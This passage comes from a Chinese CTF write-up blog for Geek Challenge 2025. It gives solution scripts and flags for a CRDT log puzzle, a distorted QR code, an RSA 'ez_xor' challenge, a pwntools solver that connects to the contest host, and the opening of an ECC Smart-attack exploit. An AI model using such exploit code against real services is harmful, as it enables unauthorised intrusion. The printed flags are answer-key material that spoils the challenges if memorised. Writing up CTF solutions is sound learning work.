</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:18&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:35&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 35
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:13&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;@&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 13
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:39&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;❌&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 39
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:31&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;D&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 31
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:26&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;★&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 26
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:42&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;w&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 42
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:40&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:20&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 20
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:23&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:22&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:35&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;v&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 35
</span></span></span><span class="line"><span class="cl"><span class="s2">  }
</span></span></span><span class="line"><span class="cl"><span class="s2">]
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ops</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">log_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">nodes</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="n">children</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">deleted</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">ops</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">op</span><span class="p">[</span><span class="s2">&#34;op&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;ins&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">node_id</span> <span class="o">=</span> <span class="n">op</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">parent</span> <span class="o">=</span> <span class="n">op</span><span class="p">[</span><span class="s2">&#34;parent&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">ch</span> <span class="o">=</span> <span class="n">op</span><span class="p">[</span><span class="s2">&#34;ch&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">nodes</span><span class="p">[</span><span class="n">node_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;ch&#34;</span><span class="p">:</span> <span class="n">ch</span><span class="p">,</span> <span class="s2">&#34;parent&#34;</span><span class="p">:</span> <span class="n">parent</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">children</span><span class="p">[</span><span class="n">parent</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">node_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">op</span><span class="p">[</span><span class="s2">&#34;op&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;del&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">deleted</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">op</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">traverse</span><span class="p">(</span><span class="n">node_id</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">child</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">children</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">node_id</span><span class="p">,</span> <span class="p">[])):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">child</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">deleted</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">nodes</span><span class="p">[</span><span class="n">child</span><span class="p">][</span><span class="s2">&#34;ch&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="n">traverse</span><span class="p">(</span><span class="n">child</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">final_text</span> <span class="o">=</span> <span class="n">traverse</span><span class="p">(</span><span class="s2">&#34;HEAD&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Output：&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">final_text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-15">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{CRDT_RGA_CHALLENGE_IS_SO_EASY}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="monitoring">monitoring
</h3><h4 id="解题记录">解题记录
</h4><p>同一张二维码两个不同的方向扭曲
因为直接用ps调图片搞不出来，干脆直接重新画一张了，首先这是29*29的二维码
<img src="/p/geek-challenge-2025-wp/image-25.png"
	width="2560"
	height="1533"
	srcset="/p/geek-challenge-2025-wp/image-25_hu_4f5910b6ab0579c0.png 480w, /p/geek-challenge-2025-wp/image-25_hu_5e8b62d362d98788.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="400px"
	
>
扫一扫直接出，虽然可能二维码有部分不太一样，但好在二维码有一定纠错功能</p>
<h4 id="flag-16">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{shi_tte_ru_yo}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="crypto">Crypto
</h2><h3 id="ez_xor">ez_xor
</h3><h4 id="解题记录-1">解题记录
</h4><p>已知
N = p * q * s * r
n = p * q
gift = p ^ q
gift1 = s &amp; r
gift2=s^r
p和q可以用factordb分解
计算 s + r,解二次方程 x^2 - A*x + s_r = 0,算出phi和e即可</p>
<h4 id="exp-22">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">isqrt</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">N</span><span class="o">=</span><span class="mi">12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="o">=</span><span class="mi">91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="mi">3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999</span>
</span></span><span class="line"><span class="cl"><span class="n">gift</span><span class="o">=</span><span class="mi">5160856643507450510397828582001051679762426399445648048700295372044216322163410374903665868763924707209143638999442462398781974627158916257502760763419216</span>
</span></span><span class="line"><span class="cl"><span class="n">gift1</span><span class="o">=</span><span class="mi">10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429</span>
</span></span><span class="line"><span class="cl"><span class="n">gift2</span><span class="o">=</span><span class="mi">2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span><span class="mi">7347058180498476506950418253215069445545968207969914980520455662633717313659407471104204242158172803075449282408078252310036642316976286820260163628266163</span>
</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span><span class="mi">12507230711101465546704208050956623660941100722518212464401483461793631816617115204878992746828172476791349975322386036828178155591256841441610173239204067</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s_r</span> <span class="o">=</span> <span class="n">N</span> <span class="o">//</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="n">gift2</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">gift1</span>
</span></span><span class="line"><span class="cl"><span class="n">D</span> <span class="o">=</span> <span class="n">A</span> <span class="o">*</span> <span class="n">A</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">s_r</span>
</span></span><span class="line"><span class="cl"><span class="n">sqrt_D</span> <span class="o">=</span> <span class="n">isqrt</span><span class="p">(</span><span class="n">D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">+</span> <span class="n">sqrt_D</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">-</span> <span class="n">sqrt_D</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">r</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-17">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">syc{we1c0me_t190_ge1k_your_code_is_v1ey_de1psrc!}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="caesar-slot-machine">Caesar Slot Machine
</h3><h4 id="解题记录-2">解题记录
</h4><p>这就是个大号的pwn签到题，只需要解
current = x % P
current = (a * current + b) % P
current == (x % P)</p>
<h4 id="exp-23">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">31768</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;DBG:&#34;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;DBG:&#34;</span><span class="p">,</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;DBG:&#34;</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">solve_mod_equation</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">b</span> <span class="o">%</span> <span class="n">P</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">P</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">a</span>
</span></span><span class="line"><span class="cl">            <span class="n">d</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">b</span> <span class="o">%</span> <span class="n">d</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">c1</span> <span class="o">=</span> <span class="n">c</span> <span class="o">//</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl">                <span class="n">b1</span> <span class="o">=</span> <span class="n">b</span> <span class="o">//</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl">                <span class="n">P1</span> <span class="o">=</span> <span class="n">P</span> <span class="o">//</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl">                <span class="n">inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">P1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">y0</span> <span class="o">=</span> <span class="p">(</span><span class="n">b1</span> <span class="o">*</span> <span class="n">inv</span><span class="p">)</span> <span class="o">%</span> <span class="n">P1</span>
</span></span><span class="line"><span class="cl">                <span class="n">solutions</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">y</span> <span class="o">=</span> <span class="n">y0</span> <span class="o">+</span> <span class="n">k</span> <span class="o">*</span> <span class="n">P1</span>
</span></span><span class="line"><span class="cl">                    <span class="n">solutions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">solutions</span>
</span></span><span class="line"><span class="cl">    <span class="n">P</span> <span class="o">=</span><span class="mi">1000000007</span>   
</span></span><span class="line"><span class="cl">    <span class="n">solutions</span> <span class="o">=</span> <span class="n">solve_mod_equation</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">calcs</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">solutions</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">calcs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ez_ecc">ez_ecc
</h3><h4 id="解题记录-3">解题记录
</h4><p>标准的ecc题目，直接套smart attack的模板即可</p>
<h4 id="exp-24">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mh">0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411</span>
